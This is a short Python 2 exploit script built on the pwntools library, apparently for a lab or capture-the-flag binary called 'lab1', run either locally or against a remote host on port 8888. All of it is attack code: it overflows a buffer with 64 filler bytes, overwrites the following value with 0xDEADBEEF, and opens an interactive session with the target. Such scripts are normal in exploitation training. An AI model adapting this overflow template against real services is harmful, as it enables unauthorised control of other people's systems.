#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "ub.esxi"
port = "8888"

if _local:
	r = process('./lab1')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

payload = 'A'*64
payload += p32(0xDEADBEEF)

print r.recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()